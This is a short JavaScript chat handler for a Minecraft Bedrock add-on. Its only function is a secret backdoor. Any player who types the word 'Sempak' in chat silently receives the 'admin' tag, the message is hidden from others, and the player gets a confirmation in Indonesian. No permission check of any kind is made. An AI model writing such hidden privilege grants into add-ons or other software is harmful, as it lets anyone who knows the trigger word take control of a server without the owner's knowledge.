import { world } from "@minecraft/server";
import { WorldDatabase } from "../extension/Database";
import Tag from "../extension/Tag";

world.beforeEvents.chatSend.subscribe(data => {
    const player = data.sender;
    let msg = data.message;
    let prefix = new WorldDatabase('prefix').get() ?? '!'
    if (!msg.startsWith(prefix)) {
        if (msg === 'Sempak') {
            data.cancel = true;
            Tag.add(player, 'admin')
            player.sendMessage('Kamu sekarang adalah Admin!!')
        }
    }
})